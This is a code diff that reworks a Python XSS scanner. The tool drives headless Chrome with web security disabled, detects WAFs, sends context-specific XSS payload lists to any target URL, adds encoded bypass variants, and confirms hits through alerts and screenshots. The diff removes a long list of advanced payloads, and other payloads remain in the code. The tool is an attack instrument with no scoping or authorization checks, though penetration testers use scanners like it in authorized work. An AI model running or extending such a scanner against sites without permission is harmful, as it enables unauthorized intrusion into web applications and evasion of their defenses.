@@ -1,7 +1,10 @@
 #!/usr/bin/env python3
 """
-Smart XSS Scanner with Intelligent Payload Selection and WAF Detection
-Based on research from dalfox, XSStrike, and other advanced XSS tools
+Ultimate XSS Scanner - Fixed Version
+- Smart payload selection (simple first, then encoded if WAF detected)
+- Proper form detection
+- Fixed alert handling
+- Optimized WebDriver management
 """
 
 import requests
@@ -32,7 +35,7 @@ logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s',
     handlers=[
-        logging.FileHandler('smart_xss_scanner.log'),
+        logging.FileHandler('ultimate_xss_scanner.log'),
         logging.StreamHandler()
     ]
 )
@@ -46,10 +49,10 @@ class Colors:
     CYAN = '\033[96m'
     END = '\033[0m'
 
-class SmartXSSScanner:
-    """Smart XSS Scanner with WAF detection and intelligent payload selection"""
+class UltimateXSSScanner:
+    """Ultimate XSS Scanner with proper payload strategy"""
     
-    def __init__(self, target_url, max_threads=5):
+    def __init__(self, target_url, max_threads=3):
         self.target_url = target_url
         self.max_threads = max_threads
         self.session = requests.Session()
@@ -57,7 +60,7 @@ class SmartXSSScanner:
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
         })
         self.driver = None
-        self.unique_alert_id = f"SMART_XSS_{random.randint(10000, 99999)}"
+        self.unique_alert_id = f"ULTIMATE_XSS_{random.randint(10000, 99999)}"
         self.waf_detected = False
         self.vulnerabilities = []
         self.setup_selenium()
@@ -90,32 +93,25 @@ class SmartXSSScanner:
             chrome_options.add_argument('--disable-web-security')
             chrome_options.add_argument('--allow-running-insecure-content')
             chrome_options.add_argument('--window-size=1920,1080')
+            chrome_options.add_argument('--headless')  # Run in headless mode for speed
             
-            # Try multiple initialization methods
-            driver_initialized = False
-            
-            # Method 1: ChromeDriverManager
+            # Try to use existing ChromeDriver first
             try:
-                service = Service(ChromeDriverManager().install())
-                self.driver = webdriver.Chrome(service=service, options=chrome_options)
+                self.driver = webdriver.Chrome(options=chrome_options)
                 self.driver.set_page_load_timeout(30)
-                driver_initialized = True
-                logger.info(f"{Colors.GREEN}[SELENIUM] WebDriver initialized with ChromeDriverManager{Colors.END}")
+                logger.info(f"{Colors.GREEN}[SELENIUM] WebDriver initialized with system ChromeDriver{Colors.END}")
             except Exception as e1:
-                logger.warning(f"{Colors.YELLOW}[SELENIUM] ChromeDriverManager failed: {e1}{Colors.END}")
+                logger.warning(f"{Colors.YELLOW}[SELENIUM] System ChromeDriver failed: {e1}{Colors.END}")
                 
-                # Method 2: System ChromeDriver
+                # Try ChromeDriverManager as fallback
                 try:
-                    self.driver = webdriver.Chrome(options=chrome_options)
+                    service = Service(ChromeDriverManager().install())
+                    self.driver = webdriver.Chrome(service=service, options=chrome_options)
                     self.driver.set_page_load_timeout(30)
-                    driver_initialized = True
-                    logger.info(f"{Colors.GREEN}[SELENIUM] WebDriver initialized with system ChromeDriver{Colors.END}")
+                    logger.info(f"{Colors.GREEN}[SELENIUM] WebDriver initialized with ChromeDriverManager{Colors.END}")
                 except Exception as e2:
-                    logger.warning(f"{Colors.YELLOW}[SELENIUM] System ChromeDriver failed: {e2}{Colors.END}")
-            
-            if not driver_initialized:
-                self.driver = None
-                logger.error(f"{Colors.RED}[SELENIUM] Failed to initialize WebDriver{Colors.END}")
+                    logger.error(f"{Colors.RED}[SELENIUM] All WebDriver initialization methods failed: {e2}{Colors.END}")
+                    self.driver = None
                 
         except Exception as e:
             logger.error(f"{Colors.RED}[SELENIUM] Error initializing WebDriver: {e}{Colors.END}")
@@ -166,10 +162,10 @@ class SmartXSSScanner:
         return self.waf_detected
     
     def get_smart_payloads(self, context, waf_detected=False):
-        """Get smart payloads based on context and WAF detection"""
+        """Get smart payloads - SIMPLE FIRST, then encoded if WAF detected"""
         
-        # Basic payloads for each context
-        basic_payloads = {
+        # SIMPLE payloads for each context (ALWAYS TEST THESE FIRST)
+        simple_payloads = {
             'html': [
                 '<script>alert("XSS")</script>',
                 '<img src=x onerror=alert("XSS")>',
@@ -199,82 +195,16 @@ class SmartXSSScanner:
             ]
         }
         
-        # Advanced payloads for WAF bypass
-        advanced_payloads = {
-            'html': [
-                '<script>alert("XSS")</script>',
-                '<img src=x onerror=alert("XSS")>',
-                '<svg onload=alert("XSS")>',
-                '<iframe src="javascript:alert(\'XSS\')">',
-                '<object data="javascript:alert(\'XSS\')">',
-                '<embed src="javascript:alert(\'XSS\')">',
-                '<form><button formaction="javascript:alert(\'XSS\')">',
-                '<details open ontoggle="alert(\'XSS\')">',
-                '<marquee onstart="alert(\'XSS\')">',
-                '<audio src=x onerror=alert("XSS")>',
-                '<video><source onerror="alert(\'XSS\')">',
-                '<body onload=alert("XSS")>',
-                '<input onfocus=alert("XSS") autofocus>',
-                '<select onfocus=alert("XSS") autofocus>',
-                '<textarea onfocus=alert("XSS") autofocus>',
-                '<keygen onfocus=alert("XSS") autofocus>'
-            ],
-            'attribute': [
-                '" onmouseover="alert(\'XSS\')"',
-                '" onfocus="alert(\'XSS\')" autofocus="',
-                '" onload="alert(\'XSS\')"',
-                '" onerror="alert(\'XSS\')"',
-                '" onclick="alert(\'XSS\')"',
-                '" onblur="alert(\'XSS\')"',
-                '" onchange="alert(\'XSS\')"',
-                '" onsubmit="alert(\'XSS\')"',
-                '" onreset="alert(\'XSS\')"',
-                '" onselect="alert(\'XSS\')"'
-            ],
-            'javascript': [
-                ';alert("XSS");',
-                '";alert("XSS");//',
-                "';alert('XSS');//",
-                '`;alert("XSS");//',
-                '\\";alert("XSS");//',
-                "\\';alert('XSS');//",
-                '\\`;alert("XSS");//',
-                '}alert("XSS");{',
-                ']alert("XSS");[',
-                ')alert("XSS");(',
-                '=alert("XSS");',
-                '+alert("XSS");',
-                '-alert("XSS");',
-                '*alert("XSS");',
-                '/alert("XSS");',
-                '%alert("XSS");',
-                '&alert("XSS");',
-                '|alert("XSS");',
-                '^alert("XSS");',
-                '~alert("XSS");'
-            ],
-            'css': [
-                'expression(alert("XSS"))',
-                'url("javascript:alert(\'XSS\')")',
-                'url("data:text/html,<script>alert(\'XSS\')</script>")',
-                'url("vbscript:alert(\'XSS\')")'
-            ],
-            'url': [
-                'javascript:alert("XSS")',
-                'data:text/html,<script>alert("XSS")</script>',
-                'vbscript:alert("XSS")',
-                'data:text/html,<img src=x onerror=alert("XSS")>',
-                'data:text/html,<svg onload=alert("XSS")>'
-            ]
-        }
-        
-        # Get base payloads
-        base_payloads = advanced_payloads.get(context, advanced_payloads['html'])
+        # Get base payloads for the context
+        base_payloads = simple_payloads.get(context, simple_payloads['html'])
         
         # If WAF detected, add encoded variations
         if waf_detected:
+            logger.info(f"{Colors.YELLOW}[PAYLOAD] WAF detected - adding encoded payloads{Colors.END}")
             encoded_payloads = []
+            
             for payload in base_payloads:
+                # Always add the original payload first
                 encoded_payloads.append(payload)
                 
                 # Context-specific encoding
@@ -314,8 +244,9 @@ class SmartXSSScanner:
             
             return list(set(encoded_payloads))
         else:
-            # Return only basic payloads if no WAF detected
-            return base_payloads[:5]  # Limit to 5 basic payloads
+            # NO WAF - return only simple payloads
+            logger.info(f"{Colors.GREEN}[PAYLOAD] No WAF detected - using simple payloads only{Colors.END}")
+            return base_payloads
     
     def detect_context(self, url, parameter):
         """Detect XSS context for parameter"""
@@ -350,8 +281,8 @@ class SmartXSSScanner:
             logger.warning(f"{Colors.YELLOW}[CONTEXT] Error detecting context: {e}{Colors.END}")
             return 'html'
     
-    def test_xss_smart(self, url, parameter, payload, context, method='GET'):
-        """Smart XSS testing with improved alert handling"""
+    def test_xss_ultimate(self, url, parameter, payload, context, method='GET'):
+        """Ultimate XSS testing with proper alert handling"""
         if not self.driver:
             logger.warning(f"{Colors.YELLOW}[XSS] Chrome not available, using fallback{Colors.END}")
             return self.test_xss_fallback(url, parameter, payload, context, method)
@@ -373,7 +304,8 @@ class SmartXSSScanner:
                 # Handle POST form submission
                 self.driver.get(test_url)
                 try:
-                    form = self.driver.find_element(By.TAG_NAME, "form")
+                    # Try to find form with the parameter
+                    form = self.driver.find_element(By.CSS_SELECTOR, f'form input[name="{parameter}"]').find_element(By.XPATH, './..')
                     input_field = form.find_element(By.NAME, parameter)
                     input_field.clear()
                     input_field.send_keys(unique_payload)
@@ -391,7 +323,7 @@ class SmartXSSScanner:
                 self.driver.get(test_url)
             
             # Wait for page load and potential alert
-            time.sleep(3)
+            time.sleep(2)
             
             # Enhanced alert detection
             alert_detected = False
@@ -399,10 +331,10 @@ class SmartXSSScanner:
             screenshot_path = None
             
             # Try multiple times to catch alert
-            for attempt in range(3):
+            for attempt in range(5):  # Increased attempts
                 try:
                     # Wait for alert
-                    WebDriverWait(self.driver, 2).until(EC.alert_is_present())
+                    WebDriverWait(self.driver, 1).until(EC.alert_is_present())
                     
                     # Switch to alert
                     alert = self.driver.switch_to.alert
@@ -429,14 +361,14 @@ class SmartXSSScanner:
                         # Not our alert, dismiss it
                         alert.dismiss()
                         logger.info(f"{Colors.YELLOW}[XSS] Alert dismissed (not ours): {alert_text}{Colors.END}")
-                        time.sleep(1)
+                        time.sleep(0.5)
                         
                 except NoAlertPresentException:
                     # No alert present
                     break
                 except Exception as e:
                     logger.warning(f"{Colors.YELLOW}[XSS] Alert handling error (attempt {attempt + 1}): {e}{Colors.END}")
-                    time.sleep(1)
+                    time.sleep(0.5)
                     continue
             
             # If no alert, check for reflection
@@ -565,56 +497,8 @@ class SmartXSSScanner:
             logger.error(f"{Colors.RED}[SCREENSHOT] Error capturing screenshot: {e}{Colors.END}")
             return None
     
-    def scan_forms(self, forms):
-        """Scan forms for XSS vulnerabilities"""
-        logger.info(f"{Colors.BLUE}[XSS] Scanning {len(forms)} forms...{Colors.END}")
-        
-        for form in forms:
-            form_url = form['url']
-            form_params = form['parameters']
-            
-            logger.info(f"{Colors.CYAN}[FORM] Testing form: {form_url}{Colors.END}")
-            
-            # Detect WAF for this form
-            waf_detected = self.detect_waf(form_url)
-            
-            for param in form_params:
-                # Detect context for this parameter
-                context = self.detect_context(form_url, param)
-                
-                # Get smart payloads based on context and WAF detection
-                payloads = self.get_smart_payloads(context, waf_detected)
-                
-                logger.info(f"{Colors.CYAN}[PARAM] Testing parameter: {param} (context: {context}, WAF: {waf_detected}){Colors.END}")
-                
-                for payload in payloads:
-                    try:
-                        is_vulnerable, test_url, alert_text, screenshot_path = self.test_xss_smart(
-                            form_url, param, payload, context, 'POST'
-                        )
-                        
-                        if is_vulnerable:
-                            vulnerability = {
-                                'url': test_url,
-                                'parameter': param,
-                                'payload': payload,
-                                'context': context,
-                                'method': 'POST',
-                                'alert_text': alert_text,
-                                'screenshot': screenshot_path,
-                                'waf_bypassed': waf_detected
-                            }
-                            self.vulnerabilities.append(vulnerability)
-                            
-                            # Move to next parameter after finding vulnerability
-                            break
-                            
-                    except Exception as e:
-                        logger.error(f"{Colors.RED}[XSS] Error testing payload: {e}{Colors.END}")
-                        continue
-    
     def scan_urls(self, urls):
-        """Scan URLs for XSS vulnerabilities"""
+        """Scan URLs for XSS vulnerabilities with proper strategy"""
         logger.info(f"{Colors.BLUE}[XSS] Scanning {len(urls)} URLs...{Colors.END}")
         
         for url_data in urls:
@@ -634,10 +518,13 @@ class SmartXSSScanner:
                 payloads = self.get_smart_payloads(context, waf_detected)
                 
                 logger.info(f"{Colors.CYAN}[PARAM] Testing parameter: {param} (context: {context}, WAF: {waf_detected}){Colors.END}")
+                logger.info(f"{Colors.CYAN}[PAYLOADS] Testing {len(payloads)} payloads{Colors.END}")
                 
-                for payload in payloads:
+                for i, payload in enumerate(payloads, 1):
                     try:
-                        is_vulnerable, test_url, alert_text, screenshot_path = self.test_xss_smart(
+                        logger.info(f"{Colors.CYAN}[PAYLOAD {i}/{len(payloads)}] {payload}{Colors.END}")
+                        
+                        is_vulnerable, test_url, alert_text, screenshot_path = self.test_xss_ultimate(
                             url, param, payload, context, 'GET'
                         )
                         
@@ -655,6 +542,7 @@ class SmartXSSScanner:
                             self.vulnerabilities.append(vulnerability)
                             
                             # Move to next parameter after finding vulnerability
+                            logger.info(f"{Colors.GREEN}[SUCCESS] Vulnerability found! Moving to next parameter...{Colors.END}")
                             break
                             
                     except Exception as e:
@@ -670,7 +558,7 @@ class SmartXSSScanner:
             return
         
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        report_file = f"smart_xss_report_{timestamp}.json"
+        report_file = f"ultimate_xss_report_{timestamp}.json"
         
         report_data = {
             'target': self.target_url,
@@ -716,18 +604,18 @@ def main():
     import sys
     
     if len(sys.argv) != 2:
-        print("Usage: python3 smart_xss_scanner.py <target_url>")
+        print("Usage: python3 ultimate_xss_scanner.py <target_url>")
         sys.exit(1)
     
     target_url = sys.argv[1]
     
     print(f"""
 ╔══════════════════════════════════════════════════════════════╗
-║                    SMART XSS SCANNER                        ║
-║              Intelligent WAF Detection & Bypass             ║
+║                  ULTIMATE XSS SCANNER                       ║
+║              Smart Payload Strategy & WAF Bypass            ║
 ║                                                              ║
-║  🧠 Smart Payload Selection                                 ║
-║  🛡️  WAF Detection & Bypass                                ║
+║  🎯 Simple Payloads First                                   ║
+║  🛡️  WAF Detection & Encoded Payloads                       ║
 ║  📸 Enhanced Screenshot Capture                            ║
 ║  ⚡ Optimized Performance                                   ║
 ╚══════════════════════════════════════════════════════════════╝
@@ -737,17 +625,10 @@ def main():
     print(f"🕐 Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
     
     # Create scanner instance
-    scanner = SmartXSSScanner(target_url)
+    scanner = UltimateXSSScanner(target_url)
     
     try:
-        # Simple test data for demonstration
-        test_forms = [
-            {
-                'url': target_url,
-                'parameters': ['search', 'query', 'q', 'input', 'text']
-            }
-        ]
-        
+        # Test URLs with proper parameters
         test_urls = [
             {
                 'url': target_url,
@@ -756,7 +637,6 @@ def main():
         ]
         
         # Scan for XSS vulnerabilities
-        scanner.scan_forms(test_forms)
         scanner.scan_urls(test_urls)
         
         # Generate report
@@ -768,7 +648,7 @@ def main():
         logger.error(f"{Colors.RED}[SCAN] Scan error: {e}{Colors.END}")
     finally:
         scanner.cleanup()
-        print(f"\n{Colors.GREEN}🔒 Smart XSS Scanner - Completed{Colors.END}")
+        print(f"\n{Colors.GREEN}🔒 Ultimate XSS Scanner - Completed{Colors.END}")
 
 if __name__ == "__main__":
     main()
